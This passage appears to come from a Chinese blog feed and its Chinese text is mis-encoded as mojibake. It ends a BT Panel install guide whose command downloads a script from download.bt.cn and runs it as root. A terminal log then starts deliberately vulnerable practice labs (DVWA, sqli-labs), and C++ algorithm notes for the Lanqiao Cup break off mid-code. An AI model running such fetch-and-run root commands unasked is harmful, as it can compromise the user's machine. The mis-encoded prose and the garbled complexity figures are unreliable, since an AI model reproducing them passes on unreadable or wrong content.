ç»‘å®šå®å¡”è´¦å·"></a>7. <strong>ç»‘å®šå®å¡”è´¦å·</strong></h4><p>ç™»å½•åï¼Œç³»ç»Ÿä¼šæç¤ºä½ ç»‘å®šå®å¡”è´¦å·ã€‚å¦‚æœä½ è¿˜æ²¡æœ‰å®å¡”è´¦å·ï¼Œä½ å¯ä»¥é€‰æ‹©æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åè¿›è¡Œç»‘å®šã€‚</p><h4 id="8-ä½¿ç”¨å®å¡”é¢æ¿"><a href="#8-ä½¿ç”¨å®å¡”é¢æ¿" class="headerlink" title="8. ä½¿ç”¨å®å¡”é¢æ¿"></a>8. <strong>ä½¿ç”¨å®å¡”é¢æ¿</strong></h4><p>ç»‘å®šè´¦å·æˆåŠŸåï¼Œä½ å°±å¯ä»¥ä½¿ç”¨å®å¡”é¢æ¿æ¥ç®¡ç†æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™ã€æ•°æ®åº“ã€FTP ç­‰æœåŠ¡äº†ã€‚</p><hr><p>å¦‚æœä½ é‡åˆ°ä»»ä½•é—®é¢˜æˆ–æœ‰ç–‘é—®ï¼Œéšæ—¶è”ç³»æˆ‘ï¼Œæˆ‘å¯ä»¥ä¸ºä½ æä¾›æ›´å¤šå¸®åŠ©ã€‚</p><p>ä»æŠ¥é”™ä¿¡æ¯æ¥çœ‹ï¼Œä½ æ­£åœ¨ä½¿ç”¨çš„æ˜¯ <strong>Ubuntu</strong> æˆ–è€…ä¸ Ubuntu ç›¸ä¼¼çš„å‘è¡Œç‰ˆï¼Œè€Œ <code>yum</code> æ˜¯ CentOS æˆ– RHEL ç³»ç»Ÿçš„åŒ…ç®¡ç†å™¨ï¼Œä¸é€‚ç”¨äº Ubuntuã€‚Ubuntu ç³»ç»Ÿä½¿ç”¨çš„æ˜¯ <code>apt</code> åŒ…ç®¡ç†å™¨ã€‚ä½ å¯ä»¥æŒ‰ç…§é€‚ç”¨äº <strong>Ubuntu</strong> çš„å®‰è£…å‘½ä»¤æ¥å®‰è£…å®å¡”é¢æ¿ã€‚</p><h3 id="Ubuntu-Deepin-å®‰è£…å®å¡”é¢æ¿çš„æ­£ç¡®å‘½ä»¤ï¼š"><a href="#Ubuntu-Deepin-å®‰è£…å®å¡”é¢æ¿çš„æ­£ç¡®å‘½ä»¤ï¼š" class="headerlink" title="Ubuntu&#x2F;Deepin å®‰è£…å®å¡”é¢æ¿çš„æ­£ç¡®å‘½ä»¤ï¼š"></a><strong>Ubuntu&#x2F;Deepin å®‰è£…å®å¡”é¢æ¿çš„æ­£ç¡®å‘½ä»¤</strong>ï¼š</h3><ol><li><p><strong>æ›´æ–°è½¯ä»¶åŒ…å’Œå®‰è£… wget</strong>ï¼š<br>å…ˆç¡®ä¿ç³»ç»Ÿè½¯ä»¶åŒ…æ˜¯æœ€æ–°çš„ï¼Œå¹¶å®‰è£… <code>wget</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update &amp;&amp; <span class="hljs-built_in">sudo</span> apt install -y wget<br></code></pre></td></tr></table></figure></li><li><p><strong>ä¸‹è½½å¹¶è¿è¡Œå®å¡”é¢æ¿å®‰è£…è„šæœ¬</strong>ï¼š<br>è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥ä¸‹è½½å¹¶å®‰è£…å®å¡”é¢æ¿ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; <span class="hljs-built_in">sudo</span> bash install.sh<br></code></pre></td></tr></table></figure></li></ol><p>å®‰è£…è¿‡ç¨‹ä¸­çš„æ­¥éª¤å’Œæç¤ºå°†ä¸ä½ ä¹‹å‰çœ‹åˆ°çš„ç›¸ä¼¼ã€‚å®‰è£…å®Œæˆåï¼Œä½ å°†çœ‹åˆ°å¤–ç½‘é¢æ¿åœ°å€ã€å†…ç½‘é¢æ¿åœ°å€ã€é»˜è®¤ç”¨æˆ·åå’Œå¯†ç ã€‚æŒ‰ç…§æ­¥éª¤å¼€æ”¾ç«¯å£å¹¶é€šè¿‡æµè§ˆå™¨ç™»å½•å®å¡”é¢æ¿ã€‚</p><p>å¦‚æœä½ ç»§ç»­é‡åˆ°é—®é¢˜ï¼Œå¯ä»¥éšæ—¶å‘Šè¯‰æˆ‘ã€‚</p><p>helloctfos@Hello-CTF:<del>$ docker â€“version<br>Docker version 25.0.4, build 1a576c5<br>helloctfos@Hello-CTF:</del>$ docker ps<br>CONTAINER ID   IMAGE                           COMMAND                  CREATED          STATUS          PORTS                          NAMES<br>39ab35c854b7   c0ny1&#x2F;dvwa:v1.9                 â€œ&#x2F;run.shâ€                12 minutes ago   Up 12 minutes   3306&#x2F;tcp, 0.0.0.0:88-&gt;80&#x2F;tcp   dvwa-web-1<br>90fd3fcc087f   ghcr.io&#x2F;digininja&#x2F;dvwa:latest   â€œdocker-php-entrypoiâ€¦â€   3 months ago     Up 24 minutes   127.0.0.1:4280-&gt;80&#x2F;tcp         dvwa-master-dvwa-1<br>cc73bc682afe   mariadb:10                      â€œdocker-entrypoint.sâ€¦â€   3 months ago     Up 24 minutes   3306&#x2F;tcp                       dvwa-master-db-1<br>helloctfos@Hello-CTF:<del>$ cd vulstudy<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy$ cd<br>helloctfos@Hello-CTF:<del>$ cd vulstudy<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy$ ls<br>BodgeIt  Hackademic  README.md   Webug               bWAPP               mutillidae       www<br>DSVW     LKWA        WackoPicko  XSS-challenge-tour  doc                 sqli-labs        xvwa<br>DVWA     MCIR        WebGoat     XSSed               docker-compose.yml  vulnerable-node<br>helloctfos@Hello-CTF:<del>&#x2F;vulstudy$ cd sqli-labs&#x2F;<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy&#x2F;sqli-labs$ ls<br>Dockerfile  docker-compose.yml<br>helloctfos@Hello-CTF:<del>&#x2F;vulstudy&#x2F;sqli-labs$ vi docker-compose.yml<br>helloctfos@Hello-CTF:</del>&#x2F;vulstudy&#x2F;sqli-labs$ docker-compose up -d<br>u</p><p>cd vulstudy</p><p>ls</p><p>cd sqli-labs&#x2F;</p><p>ls</p><p>vi docker-compose.yml</p><p>docker-compose up -d</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®—æ³•ç¬”è®°</title>
    <link href="/2024/09/09/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/09/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>æ³¨æ„:æœ¬ç¬”è®°ä»£ç éƒ½æ˜¯c++ï¼Œè€Œä¸”ä¸ºäº†è“æ¡¥æ¯åšäº†å¾ˆå¤§çš„æ”¹å˜ï¼Œæ‰€ä»¥åˆæ¬¡å­¦ä¸è¦æŒ‰ç…§æœ¬ç¬”è®°</p><h1 id="c-ä»£ç çš„åŸºç¡€å†…å®¹"><a href="#c-ä»£ç çš„åŸºç¡€å†…å®¹" class="headerlink" title="c++ä»£ç çš„åŸºç¡€å†…å®¹"></a>c++ä»£ç çš„åŸºç¡€å†…å®¹</h1><h2 id="DevC-å¸¸ç”¨å¿«æ·é”®"><a href="#DevC-å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="DevC++å¸¸ç”¨å¿«æ·é”®"></a>DevC++å¸¸ç”¨å¿«æ·é”®</h2><ol><li><p>F9<code>ï¼šç¼–è¯‘å¹¶è¿è¡Œç¨‹åºã€‚</code></p></li><li><p>Shift + F9ï¼šä»…ç¼–è¯‘ï¼ˆä¸è¿è¡Œï¼‰</p></li><li><p><code>Ctrl + /</code>ï¼šæ³¨é‡Šå½“å‰è¡Œæˆ–é€‰ä¸­çš„ä»£ç </p></li><li><p><code>Ctrl + Shift + /</code>ï¼šå–æ¶ˆæ³¨é‡Š</p></li><li><p>è¿›å…¥ <code>å·¥å…·</code> -&gt; <code>ç¼–è¾‘å™¨é€‰é¡¹</code> -&gt; <code>ä»£ç æ¨¡æ¿</code>ï¼Œåœ¨å…¶ä¸­æ·»åŠ ä½ å¸¸ç”¨çš„ä»£ç ç‰‡æ®µã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ª <code>for</code> å¾ªç¯æ¨¡æ¿ï¼Œå¿«é€Ÿæ’å…¥åˆ°ä»£ç ä¸­ã€‚</p></li><li><p>æ‰“å¼€ Dev C++ï¼Œç‚¹å‡» <strong>å·¥å…·</strong> -&gt; <strong>ç¼–è¯‘é€‰é¡¹</strong>ã€‚</p><p>åœ¨ <strong>ç¼–è¯‘é€‰é¡¹</strong> çª—å£ä¸­ï¼Œé€‰æ‹© <strong>ç¼–è¯‘å™¨è®¾ç½®</strong>ã€‚</p><p>åœ¨ <strong>è®¾ç½®</strong> é€‰é¡¹å¡ä¸‹çš„ <strong>å‘½ä»¤è¡Œ</strong> ä¸­ï¼ŒåŠ å…¥ <code>-std=c++11</code>ï¼ˆæˆ–æ›´é«˜ç‰ˆæœ¬çš„æ ‡å‡†ï¼Œå¦‚ <code>-std=c++14</code>ã€<code>-std=c++17</code>ï¼‰ã€‚</p></li><li><p>ctrl+nå¼€cppï¼Œctrl+shift+aè¿›è¡Œä¼˜åŒ–ä»£ç </p></li><li><p>èƒŒæ™¯è®¾ç½®é«˜äº®ä¸ºé»‘è‰²ï¼Œæ¨¡æ¿ä¸ºobvilition</p></li></ol><p>++++</p><h2 id="å¤´æ–‡ä»¶"><a href="#å¤´æ–‡ä»¶" class="headerlink" title="å¤´æ–‡ä»¶"></a>å¤´æ–‡ä»¶</h2><ul><li><p><code>#include &lt;bits/stdc++.h&gt;</code><br>ä¸éœ€è¦ä¸€ä¸€æ‰‹åŠ¨åŒ…å«ï¼Œä½†æ˜¯å æ—¶é—´ï¼Œå®¹æ˜“è¶…æ—¶ï¼Œä¸ä¼šå†å†™ã€‚ä¸è¿‡ç¼–è¯‘æ—¶é—´æ— æ‰€è°“äº†</p></li><li><p><code>#include &lt;iostream&gt;</code><br>æ ‡å‡†è¾“å…¥è¾“å‡ºæµï¼Œå¸¸ç”¨å¯¹è±¡ï¼š<code>std::cin</code>, <code>std::cout</code>, <code>std::cerr</code>, <code>std::endl</code>ã€‚</p></li><li><p><code>#include &lt;string&gt;</code><br>å­—ç¬¦ä¸²æ“ä½œï¼Œå¸¸ç”¨ç±»ï¼š<code>std::string</code>ï¼Œå¸¸ç”¨å‡½æ•°ï¼š<code>std::getline</code>ã€‚</p></li><li><p><code>#include &lt;cstring&gt;</code><br>Cé£æ ¼å­—ç¬¦ä¸²æ“ä½œï¼Œå¸¸ç”¨å‡½æ•°ï¼š<code>strlen</code>, <code>strcpy</code>, <code>strcmp</code>ã€‚</p></li><li><p><code>#include &lt;vector&gt;</code><br>åŠ¨æ€æ•°ç»„å®¹å™¨ï¼Œå¸¸ç”¨ç±»ï¼š<code>std::vector</code>ã€‚</p></li><li><p><code>#include &lt;algorithm&gt;</code><br>é€šç”¨ç®—æ³•ï¼Œå¸¸ç”¨å‡½æ•°ï¼š<code>std::sort</code>, <code>std::find</code>, <code>std::max</code>, <code>std::min</code>ã€‚</p></li><li><p><code>#include &lt;map&gt;</code><br>æœ‰åºé”®å€¼å¯¹å®¹å™¨ï¼Œå¸¸ç”¨ç±»ï¼š<code>std::map</code>ã€‚</p></li><li><p><code>#include &lt;unordered_map&gt;</code><br>æ— åºé”®å€¼å¯¹å®¹å™¨ï¼Œå¸¸ç”¨ç±»ï¼š<code>std::unordered_map</code>ã€‚</p></li><li><p><code>#include &lt;unordered_set&gt;</code><br>æä¾›å“ˆå¸Œé›†åˆï¼Œå¸¸ç”¨ç±»ï¼š<code>std::unordered_set</code></p></li><li><p><code>#include &lt;cmath&gt;</code><br>æ•°å­¦å‡½æ•°ï¼Œå¸¸ç”¨å‡½æ•°ï¼š<code>std::sqrt</code>, <code>std::pow</code>, <code>std::sin</code>, <code>std::cos</code>ã€‚</p></li><li><p><code>#include &lt;numeric&gt;</code><br>æ•°å€¼æ“ä½œï¼Œå¸¸ç”¨å‡½æ•°ï¼š<code>std::accumulate</code>, <code>std::gcd</code>ã€‚</p></li><li><p><code>#include &lt;utility&gt;</code><br>å·¥å…·å‡½æ•°ï¼Œå¸¸ç”¨ç±»ï¼š<code>std::pair</code>ã€‚</p></li></ul><h2 id="æ—¥æœŸå¡«ç©ºé¢˜å·§ç”¨ç”µè„‘è‡ªå¸¦Officeè½¯ä»¶"><a href="#æ—¥æœŸå¡«ç©ºé¢˜å·§ç”¨ç”µè„‘è‡ªå¸¦Officeè½¯ä»¶" class="headerlink" title="æ—¥æœŸå¡«ç©ºé¢˜å·§ç”¨ç”µè„‘è‡ªå¸¦Officeè½¯ä»¶"></a>æ—¥æœŸå¡«ç©ºé¢˜å·§ç”¨ç”µè„‘è‡ªå¸¦Officeè½¯ä»¶</h2><h4 id="æ±‚æ—¥æœŸå·®ï¼ˆexcelï¼‰"><a href="#æ±‚æ—¥æœŸå·®ï¼ˆexcelï¼‰" class="headerlink" title="æ±‚æ—¥æœŸå·®ï¼ˆexcelï¼‰"></a>æ±‚æ—¥æœŸå·®ï¼ˆexcelï¼‰</h4><p>æ ¼ä¸­è¾“å…¥ï¼š </p><hr><h1 id="è“æ¡¥æ¯å¤‡è€ƒ"><a href="#è“æ¡¥æ¯å¤‡è€ƒ" class="headerlink" title="è“æ¡¥æ¯å¤‡è€ƒ"></a>è“æ¡¥æ¯å¤‡è€ƒ</h1><p>C++ä»£ç ä¸­çš„æ“ä½œæ¬¡æ•°æ§åˆ¶åœ¨ 10çš„7ä¸ºæœ€ä½³ã€‚64MBç›¸å½“äº10çš„7ä¸ªint</p><h2 id="Nçš„èŒƒå›´åˆ¤æ–­ç®—æ³•æ˜¯ä»€ä¹ˆ"><a href="#Nçš„èŒƒå›´åˆ¤æ–­ç®—æ³•æ˜¯ä»€ä¹ˆ" class="headerlink" title="Nçš„èŒƒå›´åˆ¤æ–­ç®—æ³•æ˜¯ä»€ä¹ˆ"></a>Nçš„èŒƒå›´åˆ¤æ–­ç®—æ³•æ˜¯ä»€ä¹ˆ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1.</span>n &lt; <span class="hljs-number">30</span>,æŒ‡æ•°çº§åˆ«, dfs+å‰ªæï¼ŒçŠ¶æ€å‹ç¼©dp<br><span class="hljs-number">2.</span>n &lt; <span class="hljs-number">100</span>=&gt;<span class="hljs-number">0</span>(n)ï¼Œfoyd, dp<br><span class="hljs-number">3.</span>n&lt;<span class="hljs-number">1000</span>=&gt;<span class="hljs-number">0</span>(n2)ï¼Œ<span class="hljs-number">0</span>(n?logn)ï¼Œdpï¼ŒäºŒåˆ†<br><span class="hljs-number">4.</span>n â‰¤ <span class="hljs-number">10000</span> =&gt;<span class="hljs-number">0</span>(n* âˆšn)ï¼Œå—çŠ¶é“¾è¡¨<br><span class="hljs-number">5.</span>&lt; <span class="hljs-number">100000</span>=&gt;<span class="hljs-number">0</span>(nlogn)=&gt;å„ç§sortï¼Œçº¿æ®µæ ‘ã€æ ‘çŠ¶æ•°ç»„ã€<span class="hljs-built_in">set</span>/<span class="hljs-built_in">map</span>ã€heapã€dijkstratheapã€spfaã€æ±‚å‡¸åŒ…ã€æ±‚åŠ<br>å¹³é¢äº¤ã€äºŒåˆ†<br><span class="hljs-number">6.</span>n&lt; <span class="hljs-number">1000000</span> =&gt; <span class="hljs-number">0</span>(m),ä»¥åŠå¸¸æ•°è¾ƒå°çš„ <span class="hljs-number">0</span>(nlogn)ç®—æ³•=&gt;hashã€åŒæŒ‡é’ˆæ‰«æã€kmpã€ACè‡ªåŠ¨æœºï¼Œå¸¸æ•°æ¯”è¾ƒå°çš„O(nlogn)çš„åšæ³•:sortã€æ ‘çŠ¶æ•°ç»„ã€heapã€dijkstraã€spfa<br><span class="hljs-number">7.</span>n &lt; <span class="hljs-number">10000000</span> =&gt;<span class="hljs-number">0</span>(n)ï¼ŒåŒæŒ‡é’ˆæ‰«æã€kmpã€ACè‡ªåŠ¨æœºã€çº¿æ€§ç­›ç´ æ•°<br><span class="hljs-number">8.</span>n â‰¤ <span class="hljs-number">10</span>Â° =&gt;O(âˆšÏ€)ï¼Œåˆ¤æ–­è´¨æ•°<br><span class="hljs-number">9.</span>n&lt; <span class="hljs-number">1018</span> =&gt;<span class="hljs-number">0</span>(logn)ï¼Œæœ€å¤§å…¬çº¦æ•°<br></code></pre></td></tr></table></figure><h2 id="æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼š"><a href="#æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼š" class="headerlink" title="æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼š"></a>æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼š</h2><p>é¡ºåºï¼Œé€‰æ‹©ï¼Œå¾ªç¯ï¼Œæ•°ç»„ï¼Œå‡½æ•°ï¼Œå­—ç¬¦ä¸²ï¼Œç»“æ„ä½“(ç±»)çš„è¯­æ³•(å¿…ä¼š)ï¼Œé«˜ç²¾åº¦ ï¼Œç»„åˆæ•°çš„æ€æƒ³ï¼Œæ¦‚ç‡è®ºä¸æœŸæœ›å¸¸è§å…¬å¼ï¼Œæ‰¾è§„å¾‹èƒ½åŠ›ï¼Œè¿›åˆ¶è½¬æ¢</p><h2 id="åŸºç¡€ç®—æ³•"><a href="#åŸºç¡€ç®—æ³•" class="headerlink" title="åŸºç¡€ç®—æ³•"></a>åŸºç¡€ç®—æ³•</h2><p>ä¸€ç»´å‰ç¼€å’Œå·®åˆ†ä¸äºŒç»´å‰ç¼€å’Œå·®åˆ†(å¿…ä¼šï¼Œæ€æƒ³å¾ˆç®€å•)</p><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><p>é“¾è¡¨ï¼Œé˜Ÿåˆ—ï¼Œæ ˆ(æ¨¡æ‹Ÿ)ï¼Œä¼˜å…ˆåˆ—é˜Ÿ&#x2F;å †ï¼Œå“ˆå¸Œè¡¨ï¼Œå•è°ƒæ ˆï¼Œå•è°ƒé˜Ÿåˆ—ï¼ŒäºŒç»´å•è°ƒé˜Ÿåˆ—(æ±‚è§£å­çŸ©é˜µæœ€å€¼ï¼Œå°½é‡ä¼š)ï¼Œå¹¶æŸ¥é›†ï¼Œæ ‘çŠ¶æ•°ç»„(è§£å†³å•ç‚¹ä¿®æ”¹ï¼ŒåŒºé—´æ±‚å’Œé—®é¢˜ï¼Œå°½é‡ä¼šï¼Œä¸€èˆ¬è€ƒå°±å‹è½´)ï¼Œçº¿æ®µæ ‘</p><h2 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h2><p>dfs(å›æº¯),bfs(å¿…ä¼šï¼Œæ¯”è¾ƒç®€å•ï¼Œè§£å†³ç­‰æƒå€¼æœ€å°è·¯å¾„é—®é¢˜),äºŒè¿›åˆ¶æšä¸¾(å¿…ä¼šï¼Œè¿‘ä¸‰å¹´å¡«ç©ºé¢˜è€ƒçš„å¤šï¼Œç”¨äºŒè¿›åˆ¶ä½01è¡¨ç¤ºé€‰å’Œä¸é€‰)</p><h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><p>è®°å¿†åŒ–æœç´¢(å°½å¯èƒ½ä¼šï¼Œå› ä¸ºåŸºæœ¬ä¸Šæ‰€æœ‰dpé¢˜éƒ½å¯ä»¥ç”¨è®°æœ)</p><p>çº¿æ€§dp(å¿…ä¼šï¼Œè€ƒçš„éå¸¸å¤šä¸é¢‘ç¹ï¼Œå‰å‡ å¹´åŸºæœ¬ä¸Šä¸€åœºä¼šå‡ºç°è‡³å°‘äºŒé¢˜çº¿æ€§dpï¼Œå»å¹´æ²¡è€ƒ)</p><p>èƒŒåŒ…é—®é¢˜ä¸èƒŒåŒ…è®¡æ•°(å¿…ä¼šï¼Œ01ï¼Œå®Œå…¨ï¼Œå¤šé‡ï¼Œè¿˜æœ‰ä¸ªæ•´æ•°åˆ’åˆ†é—®é¢˜)</p><p>åŒºé—´dp,æ ‘å½¢dp,æ•°ä½dp,çŠ¶å‹dp</p><h2 id="æ•°è®º"><a href="#æ•°è®º" class="headerlink" title="æ•°è®º"></a>æ•°è®º</h2><p>æœ€å¤§å…¬çº¦æ•°ï¼Œæœ€å°å…¬å€æ•°ï¼Œå”¯ä¸€åˆ†è§£å®šç†(å¿…ä¼š)<br>ç´ æ•°ï¼Œç´ æ•°ç­›æ³• (å¿…ä¼š)<br>å¿«é€Ÿå¹‚ï¼Œè´¹é©¬å°å®šç†æ±‚é€†å…ƒ(å¿…ä¼š)<br>æ’åˆ—ç»„åˆï¼Œç¬¬äºŒç±»æ–¯ç‰¹æ—æ•°(å¿…ä¼š)<br>æ¦‚ç‡è®ºä¸æœŸæœ›å…¬å¼(å°½é‡ä¼šï¼Œå»å¹´ç¬¬ä¸€æ¬¡è€ƒï¼Œç„¶åæ¯å¹´éƒ½ä¼šè€ƒå‡å€¼æœŸæœ›)<br>çŸ©é˜µä¹˜æ³•(å°½é‡ä¼šï¼Œè¿‘å‡ å¹´æ²¡è€ƒè¿‡)<br>æ•°è®ºåˆ†å—(å°½é‡ä¼šï¼Œè¿‘å‡ å¹´æ²¡è€ƒè¿‡)</p><h2 id="å›¾è®º"><a href="#å›¾è®º" class="headerlink" title="å›¾è®º"></a>å›¾è®º</h2><p>å•èµ·ç‚¹å¤šç»ˆç‚¹æ­£æƒæœ€çŸ­è·¯(å¿…ä¼šï¼Œdijikstra)<br>å•èµ·ç‚¹å¤šç»ˆç‚¹è´Ÿæƒæœ€çŸ­è·¯(å¿…ä¼šï¼ŒBellmanfordï¼Œspfa)<br>å¤šèµ·ç‚¹å¤šç»ˆç‚¹æœ€çŸ­è·¯(å¿…ä¼šï¼ŒFloy è®°ä½å¾ªç¯kijå°±å¥½ï¼‰<br>æœ€å°ç“¶é¢ˆè·¯<br>æœ€å°ç”Ÿæˆæ ‘<br>æœ€è¿‘å…¬å…±ç¥–å…‰(Ica)å°½é‡ä¼š)</p><h2 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h2><p>å­—ç¬¦ä¸²å“ˆå¸Œ(å¿…ä¼šï¼Œå°¤å…¶æ˜¯ä¸äºŒåˆ†ç»“åˆçš„æ€æƒ³ä»¥åŠå›æ–‡åŠå¾„å›æ–‡ä¸­å¿ƒçš„æ€æƒ³)<br>kmp(å¿…ä¼šï¼Œä¼šæ±‚å‘¨æœŸ)<br>manacher(æ±‚å›æ–‡ä¸²ï¼Œå°½å¯èƒ½ä¼š)<br>å­—å…¸æ ‘(å°½å¯èƒ½ä¼š)</p><p>åˆ‡è®°ï¼šå°å¿ƒå˜é‡è¦†ç›–çš„é—®é¢˜</p><hr><h1 id="C-ç®—æ³•è¯¦ç»†å†…å®¹"><a href="#C-ç®—æ³•è¯¦ç»†å†…å®¹" class="headerlink" title="C++ç®—æ³•è¯¦ç»†å†…å®¹"></a>C++ç®—æ³•è¯¦ç»†å†…å®¹</h1><h2 id="åŸºç¡€æ•°æ®ç»“æ„å’Œç®—æ³•"><a href="#åŸºç¡€æ•°æ®ç»“æ„å’Œç®—æ³•" class="headerlink" title="åŸºç¡€æ•°æ®ç»“æ„å’Œç®—æ³•"></a><strong>åŸºç¡€æ•°æ®ç»“æ„å’Œç®—æ³•</strong></h2><h3 id="1-åŸºç¡€è¯­æ³•ä¸æ•°æ®ç±»å‹"><a href="#1-åŸºç¡€è¯­æ³•ä¸æ•°æ®ç±»å‹" class="headerlink" title="1. åŸºç¡€è¯­æ³•ä¸æ•°æ®ç±»å‹"></a>1. <strong>åŸºç¡€è¯­æ³•ä¸æ•°æ®ç±»å‹</strong></h3><h4 id="1-è¾“å…¥è¾“å‡º"><a href="#1-è¾“å…¥è¾“å‡º" class="headerlink" title="1.è¾“å…¥è¾“å‡º"></a>1.è¾“å…¥è¾“å‡º</h4><p>cinå’Œcout</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">cin</span> &gt;&gt; a;  <span class="hljs-comment">// ä»é”®ç›˜è¾“å…¥ä¸€ä¸ªæ•´æ•°</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; a &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br><br><span class="hljs-type">char</span> ch;<br><span class="hljs-built_in">cin</span> &gt;&gt; ch;  <span class="hljs-comment">// è¾“å…¥ä¸€ä¸ªå­—ç¬¦</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Character: &quot;</span> &lt;&lt; ch &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡ºå­—ç¬¦</span><br><br><br><span class="hljs-built_in">string</span> str;<br><span class="hljs-built_in">cin</span> &gt;&gt; str;  <span class="hljs-comment">// åªä¼šè¯»å–ä¸€ä¸ªå•è¯ï¼Œé‡åˆ°ç©ºæ ¼ä¼šåœæ­¢</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">string</span> str;<br>getline(<span class="hljs-built_in">cin</span>, str);  <span class="hljs-comment">// è¯»å–ä¸€æ•´è¡Œï¼ŒåŒ…æ‹¬ç©ºæ ¼ï¼Œç”¨ä¹‹å‰ç¡®è®¤æ˜¯å¦æœ‰ç©ºå­—ç¬¦ï¼Œç”¨getcharå¤„ç†</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;You entered: &quot;</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br></code></pre></td></tr></table></figure><p>scanfå’Œprintf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%f%lf%s%c&quot;</span>, &amp;a, &amp;b, &amp;c, str,ch);<span class="hljs-comment">// Double: %lfï¼Œ é»˜è®¤ä¿ç•™6ä½å°æ•°,Char: %c, å›è½¦ä¹Ÿæ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œç”¨â€™\nâ€™è¡¨ç¤º ,%sè¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆé‡åˆ°ç©ºæ ¼ä¼šåœæ­¢ï¼‰</span><br><br><span class="hljs-type">int</span> arr[<span class="hljs-number">100000</span>];  <span class="hljs-comment">// å‡è®¾æœ€å¤§è¾“å…¥é‡æ˜¯100000</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i)  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;arr[i]);<br>  <br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);  <span class="hljs-comment">// è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆç›´åˆ°é‡åˆ°ç©ºæ ¼ï¼‰</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ä½ è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯: %s\n&quot;</span>, str);<br><br><span class="hljs-type">char</span> str[<span 